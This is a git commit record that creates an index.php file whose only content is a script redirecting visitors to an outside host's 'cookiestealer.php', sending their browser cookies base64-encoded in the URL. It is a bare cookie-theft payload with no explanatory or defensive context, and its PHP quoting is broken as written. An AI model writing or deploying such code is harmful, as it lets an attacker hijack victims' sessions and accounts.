7607115d66bfbe3a7e373258cdcddd6faac13f1f
GlebFisher <43784335+GlebFisher@users.noreply.github.com>
2019-10-24 02:21:24 +0300

    Create index.php

---
+++ index.php
@@ -0,0 +1,5 @@
+<?php
+echo "<script type="text/javascript">
+			document.location='https://glebfisherr.myjino.ru/SANYA/lsova/cookiestealer.php?c='+encodeURIComponent(btoa(document.cookie));
+		</script>";
+?>
